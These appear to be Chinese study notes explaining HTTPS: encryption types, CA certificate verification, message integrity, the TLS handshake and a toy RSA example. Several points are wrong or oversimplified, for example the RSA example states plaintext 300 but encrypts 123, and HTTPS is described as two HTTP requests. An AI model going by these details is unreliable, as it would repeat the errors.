##### 1. HTTP的安全性问题

HTTP 有以下安全性问题：

- (1) 使用**明文**进行通信，内容可能会被**窃听**。
- (2) **不验证**通信方的身份，通信方的身份有可能遭遇**伪装**。
- (3) 无法证明报文的**完整性**，报文有可能遭**篡改**。

##### 2. HTTPS概念

HTTPS 并不是新协议，而是让 **HTTP** 先和 **SSL/TLS**（Secure Sockets Layer）**通信**，再由 **SSL/TLS 和 TCP** 通信，也就是说 HTTPS 使用了**隧道**进行通信。通过使用 SSL/TLS，HTTPS 具有了**加密（防窃听）、认证（防伪装）和完整性保护（防篡改）**。

**==HTTP + 加密 + 认证 +  完整性保护 = HTTPS==**。HTTPS 经由 HTTP 进行通信，但利用 **SSL/TLS 来保证安全**，即 ==**HTTPS = HTTP + SSL/TLS**==。

**TLS**：位于 HTTP 和 TCP **之间**的协议，其内部有 TLS 握手协议、TLS 记录协议。

<img src="assets/1563596355451-1590926741449.png" alt="1563596355451" style="zoom:52%;" />

下面会详述 HTTPS 是**如何解决加密、认证与完整性保护**的问题。

****

##### 3. HTTP和HTTPS的区别

- **端口不同** ：HTTP 的 URL由“**http**://”起始且默认使用端口 **80**，而 HTTPS 的 URL 由“**https**://”起始且默认使用端口 **443**。

- **安全性**：HTTP 协议运行在 TCP 之上，所有传输的内容都是**明文**，客户端和服务器端都**无法验证对方的身份**。HTTPS 是运行在 **SSL/TLS** 之上的 HTTP 协议，**SSL/TLS 运行在 TCP** 之上。所有传输的内容都经过**加密**，加密采用**对称加密，但对称加密的密钥用服务器方的证书进行了非对称加密**。所以说 HTTP 安全性没有 HTTPS 高 。

- **资源消耗**：HTTPS 比 HTTP 耗费更多服务器资源。HTTPS 协议需要到 CA 申请证书，一般免费证书很少，需要交费。 

##### 4. HTTPS的缺点

- 因为需要进行**加密解密**等过程，对 CPU 的额外**开销较大**，因此速度会更慢；
- 需要支付证书授权的**高额费用**。



#### 加密

##### 1. 对称密钥加密

**对称密钥加密**（Symmetric-Key Encryption），加密和解密使用**同一密钥**。密钥只有一个，加密解密为同一个密码，且加解密速度快。

- **优点**：运算速度快。
- **缺点**：无法安全地将**密钥**传输给通信方。

常用的对称加密算法：**AES**、3DES。

<img src="assets/1563596371003-1590926744330.png" alt="1563596371003" style="zoom:60%;" />

##### 2. 非对称密钥加密

**非对称密钥加密**，又称**公开密钥加密**（Public-Key Encryption），加密和解密使用**不同的密钥**。密钥**成对**出现（且根据公钥无法推知私钥，根据私钥也无法推知公钥），加密解密使用不同密钥（公钥加密需要私钥解密，私钥加密需要公钥解密），相对对称加密速度**较慢**。

非对称加密一般有两种密钥，**公钥和私钥**，**公钥一般用于加密，私钥一般用于解密**。

常用的非对称加密算法：**RSA**（安全基于大质数的分解难度）、**ECC、SM2** 等。

公开密钥所有人都可以获得，**通信发送方获得接收方的公开密钥之后，就可以==使用公开密钥进行加密==，==接收方收到通信内容后使用私有密钥解密==。**

非对称密钥除了用来**加密**，还可以用来进行**签名**。因为私有密钥无法被其他人获取，因此通信发送方使用其**==私有密钥进行签名==**，通信接收方使用发送方的公开密钥**==对签名进行解密==**，就能判断这个签名是否正确。

- **优点**：可以更安全地将公开密钥传输给通信发送方；
- **缺点**：运算速度慢，消耗更多的资源。

![image-20191229163613698](assets/image-20191229163613698-1590926711864.png)

##### 3. HTTPS的加密方式

HTTPS 采用==**混合的加密机制**==，**在==交换密钥==环节使用==非对称加密==（公开密钥）方式，之后建立==通信==交换报文阶段（普通数据）则使用==对称加密==（共享密钥加密）方式**。

数据通信时需要用到一个**对称加密**的密钥，但是**直接**发过去是**不安全**的，所以使用**非对称加密**的方式将需要得**对称加密密钥**发送过去。

![image-20191229163806491](assets/image-20191229163806491-1590926711864.png)

一个非常好懂的**加密流程图**。

<img src="assets/1563596421424-1590926762186.png" alt="1563596421424" style="zoom:25%;" />

上述的流程**还差一步**，就是服务器发送**公钥**给客户端的时候，也会一起**发送 CA 数字签名**给客户端用于**认证。**（下面详述）

使用自己的**私钥**对自己所认可的消息生成一个该消息专属的**签名**，这就是**数字签名**，表明**我承认该消息来自自己**。注意：**私钥用于加签，公钥用于解签，每个人都可以解签，查看消息的归属人**。

**客户端：明文 + 公钥 = 密文**。

**服务器：密文 + 私钥 = 明文**。

注意：**公钥用于加密，私钥用于解密，只有私钥的归属者，才能查看消息的真正内容**。

#### 认证

当服务器接收到客户端发来的请求时，会向客户端**发送**服务器自己的**公钥**，但是**黑客有可能中途篡改公钥**，将其改成黑客自己的，所以有个问题，客户端怎么信赖这个公钥是自己想要访问的服务器的公钥而不是黑客的呢？所以客户端也需要对服务器发送过来的**公钥认证其合法性**。 这时候就需要用到 **CA 数字证书**。

**证书**：全称公钥证书（Public-Key Certificate, PKC），里面保存着归属者的基本信息，以及证书过期时间、归属者的公钥，并由认证机构（Certification Authority, **CA**）施加数字签名，表明某个认证机构认定该公钥的确属于此人。

**数字证书认证机构**（**CA**，Certificate Authority）：客户端与服务器双方**都可信赖**的第**三方机构**。

> **如何认证**？

(1) 首先阿里需要将自己的**公钥**发送给 **CA 机构**进行公钥申请，如果通过，则 CA 机构（CA 机构**自己也有公钥和私钥**）则利用其**私钥**对阿里的**公钥进行非对称加密**，得到加密后的**明文**（**数字签名**）。加密完之后，得到的密文再加上**证书的过期时间、颁发给、颁发者**等信息，就组成了**数字证书**。（**数字证书就是数字签名加上各种附加信息**）。

(2) 用户浏览器向阿里发起 HTTPS 连接请求，阿里会将其**公钥 + 数字证书**发送给客户端。

(3) 客户端首先需要对接收到的**公钥进行验证**，以确保公钥**真的就是阿里的而且没有被人篡改**。不论什么平台，设备的操作系统中都会**内置** 100 多个全球公认的 **CA 的公钥**。所以客户端使用 **CA 机构的公钥对数字证书中的数字签名**进行**认证**（因为证书是由 CA 机构的私钥加密的，所以可以用 CA 的公钥来验证）：

- 首先客户端会用设备中内置的 CA 的**公钥**尝试**解密数字证书**，如果所有内置的 CA 的公钥都**无法解密**该数字证书，说明该数字证书不是由一个全球知名的 CA 签发的，这样客户端就**无法信任**该服务器的**数字证书**。
- 如果有一个 CA 的公钥能够成功**解密**该数字证书，说明该数字证书就是由该 CA 的私钥**签发**的，因为被私钥加密的密文只能被与其成对的公钥解密。
- 除此之外，还需要检查客户端当前访问的服务器的域名是与数字证书中提供的“颁发给”这一项吻合，还要检查数字证书是否过期等。

只有通过**认证之后**才能确保这个公钥真的是阿里发送给客户端的，才能继续后面的加密与通信步骤。流程看下图。

<img src="assets/1563596449006-1590926768385.png" alt="1563596449006" style="zoom:72%;" />

|      密码      |                作用                |           组成            |
| :------------: | :--------------------------------: | :-----------------------: |
| **消息认证码** | 确认消息的完整、并对消息的来源认证 |   共享秘钥+消息的散列值   |
|  **数字签名**  |         对消息的散列值签名         |  公钥+私钥+消息的散列值   |
|  **公钥密码**  |     解决**秘钥**的**配送问题**     |      公钥+私钥+消息       |
|    **证书**    |         解决公钥的归属问题         | 公钥密码中的公钥+数字签名 |

#### 完整性保护

**SSL** 提供一种叫做 **MAC** 的==**报文摘要**==功能来进行**完整性保护**。

HTTP 也提供了 **MD5** 报文摘要功能，但**不是安全**的。例如报文内容被篡改之后，同时**重新计算** MD5 的值，通信接收方是无法意识到发生了篡改。

HTTPS 的报文**摘要功能**之所以安全，是因为它结合了**加密和认证**这两个操作。加密之后的报文，遭到篡改之后，也很难重新计算报文摘要，因为无法轻易获取明文。



#### HTTPS通信流程总结

![image-20191229164615493](assets/image-20191229164615493-1590926711864.png)

**服务器端的公钥和私钥，用来进行非对称加密。客户端生成的随机密钥，用来进行对称加密通信。**

一个 HTTPS 请求实际上包含了**两次 HTTP** 传输，可以细分为 8 步。

(1) 客户端向服务器发起 **HTTPS 请求**，连接到服务器的 **443 端口**。

(2) 服务器端有一个密钥对，即**公钥和私钥**，是用来进行非对称加密使用的，**服务器端保存着私钥**，不能将其泄露，公钥可以发送给任何人。

(3) 服务器将自己的**公钥发送给客户端**。

(4) 客户端收到服务器端的公钥之后，会对**公钥进行检查**，验证其**合法性**，如果发现发现公钥有问题，那么 HTTPS 传输就无法继续。严格的说，这里就是**验证服务器发送的==数字证书==的合法性**，关于客户端如何验证数字证书的合法性，上文已经说明。如果**公钥合格**，那么**客户端**会生成一个**随机值**，这个随机值就是用于进行对称加密的**密钥**，将该密钥称之为 client key，即**客户端密钥**，这样在概念上和服务器端的密钥容易进行区分。然后用服务器的**公钥**对**客户端密钥进行==非对称加密==**，这样客户端密钥就变成密文了，至此，HTTPS 中的第一次 HTTP 请求结束。

(5) **客户端**会发起 HTTPS 中的**第二个** HTTP 请求，将**加密之后的客户端密钥发送给服务器**。

(6) 服务器接收到客户端发来的密文之后，会用自己的**私钥**对其进行**非对称解密**，解密之后的明文就是**客户端密钥**，然后用客户端密钥对数据进行==**对称加密**==，这样数据就变成了**密文**。

(7) 然后服务器将**加密后的密文**发送给客户端。

(8) 客户端收到服务器发送来的密文，用客户端密钥对其进行对称解密，得到服务器发送的数据。这样 HTTPS 中的第二个 HTTP 请求结束，整个 HTTPS 传输完成。





#### SSL与TLS

##### 1. 概述

TLS/SSL是一种**加密通道的规范**。

- **SSL**：（Secure Socket Layer） 安全套接层，于 1994 年由网景公司设计，并于 1995 年发布了 3.0 版本。
- **TLS**：（Transport Layer Security）**传输层安全性协议**，是 IETF 在 SSL3.0 的**基础上**设计的协议，可以理解为 SSL 3.1，该协议由两层组成： TLS 记录协议（TLS Record）和 TLS 握手协议（TLS Handshake）。较低的层为 TLS 记录协议，位于某个可靠的传输协议（例如 TCP）上面。

以下全部使用 TLS 来表示。TLS 是一系列密码工具的**框架**，作为框架，它也是非常的灵活，体现在每个工具套件它都可以替换，即：客户端与服务端之间协商密码套件，从而更难的被攻破，例如使用不同方式的对称密码，或者公钥密码、数字签名生成方式、单向散列函数技术的替换等。

在**发送方**，SSL 接收**应用层**的数据，对数据进行**加密**，然后把加了密的数据送往 **TCP 套接字**。在**接收方**，SSL 从 TCP 套接字**读取**数据，**解密**后把数据交给**应用层**。 

##### 2. SSL/TLS 握手流程

SSL/TLS 握手是为了**安全**地协商出一份**对称加密**的秘钥，这个过程如下。

<img src="assets/https_com.png" style="zoom:67%;" />



###### (1) Client Hello

**握手**第一步是客户端向服务端发送 **Client Hello** 消息，这个消息里包含了一个客户端生成的随机数 **Random1**、客户端支持的**加密套件**（Support Ciphers）和 **SSL Version** 等信息。

###### (2) Server Hello

第二步是服务端向客户端发送 **Server Hello** 消息，这个消息会从 Client Hello 传过来的 Support Ciphers 里确定一份加密套件，这个套件决定了后续加密和生成摘要时具体**使用哪些算法**，另外还会生成一份随机数 **Random2**。注意，至此客户端和服务端都拥有了**两个随机数**（Random1+ Random2），这两个随机数会在**后续生成对称秘钥**时用到。

###### (3) Server Certificate

这一步是服务端将自己的**证书下发给客户端**，让客户端验证服务器的身份，客户端验证通过后**取出证书中的公钥**。

###### (4) Server Hello Done

Server Hello Done 通知客户端 Server Hello 过程结束。

###### (5) Client Key Exchange

上面客户端根据服务器传来的**公钥**生成了 **PreMaster Key**，Client Key Exchange 就是将这个 **key 传给服务端**，服务端再用自己的**私钥**解出这个 **PreMaster Key** 得到客户端生成的 **Random3**。至此，客户端和服务端都拥有 **Random1** + **Random2** + **Random3**，两边再根据同样的算法就可以**生成一份秘钥**，握手结束后的应用层数据都是使**用这个秘钥进行对称加密**。

为什么要使用**三个随机数**？这是因为 SSL/TLS 握手过程的数据都是明文传输的，并且多个随机数种子来生成秘钥不容易被暴力破解出来。

###### (6) Change Cipher Spec(Client)

这一步是客户端通知服务端后面再发送的消息都会使用前面协商出来的秘钥加密了，是一条事件消息。

###### (7) Finished(Client)

客户端发送 **Finished** 报文。该报文包含连接至今全部报文的整理校验值。这次握手协议是否能成功，要以服务器是否能够正确解密该报文作为判定标准。

###### (8) Change Cipher Spec(Server)

服务器同样发送 Change Cipher Spec 报文给客户端。

###### (9) Finished(Server)

服务器同样发送Finished报文给客户端。

###### (10-11) Application Data

到这里双方已安全地协商出了**同一份秘钥**，所有的应用层数据都会用这个秘钥加密后再通过 TCP 进行可靠传输。 

###### (12) Alert：warning, close notify

最后由客户端断开连接。断开连接时，发送close_notify报文。上图做了一些省略，在这步之后再发送一种叫做MAC（Message Authentication Code）的报文摘要。MAC能够查知报文是否遭到篡改，从而保护报文的完整性。

###### (*) demand client certificate

Certificate Request 是服务端要求客户端上报证书，这一步是可选的，对于安全性要求高的场景会用到。

###### (*) check server certificate

客户端收到服务端传来的证书后，先从 CA 验证该证书的合法性，验证通过后取出证书中的服务端公钥，再生成一个随机数 **Random3**，再用服务端公钥非对称加密 **Random3** 生成 **PreMaster Key**。

流程图示如下：

<img src="assets/SSL_handshake.png"/>

#### RSA算法

RSA 是一种**公钥密码算法**，简单的走一遍它的加密解密过程。

- **加密算法**：密文 = **(明文^E) mod N**，其中公钥为{E, N}，即”求明文的 E 次方的对 N 的余数“。  

- **解密算法**：明文 = **(密文^D) mod N，**其中秘钥为{D, N}，即”求密文的 D 次方的对 N 的余数“。

例：已知公钥为{5, 323}，私钥为{29, 323}，明文为 300，请写出加密和解密的过程：

**加密**：密文 = 123 ^ 5 mod 323 = 225。

**解密**：明文 = 225 ^ 29 mod 323 = [[(225 ^ 5) mod 323] * [(225 ^ 5) mod 323] * [(225 ^ 5) mod 323] * [(225 ^ 5) mod 323] * [(225 ^ 5) mod 323] * [(225 ^ 4) mod 323]] mod 323 = (4 * 4 * 4 * 4 * 4 * 290) mod 323 = 123。



​                                                          









